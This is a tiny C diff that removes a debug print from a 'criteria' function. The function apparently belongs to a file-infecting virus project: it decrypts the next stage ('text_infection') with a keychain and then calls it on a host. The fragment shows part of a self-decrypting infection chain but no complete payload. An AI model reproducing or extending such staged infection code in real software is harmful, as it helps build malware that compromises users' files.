@@ -24,7 +24,6 @@ void criteria(struct s_host *host, struct s_keychain *keychain)
 	update_keychain_left(keychain, (char *)criteria, (void *)text_infection - (void *)criteria);
 	decrypt_left(keychain, (char *)text_infection, (void *)note_infection - (void *)text_infection);
 
-	printf("criteria\n\n");
 	text_infection(host, keychain);
 
 label_error:
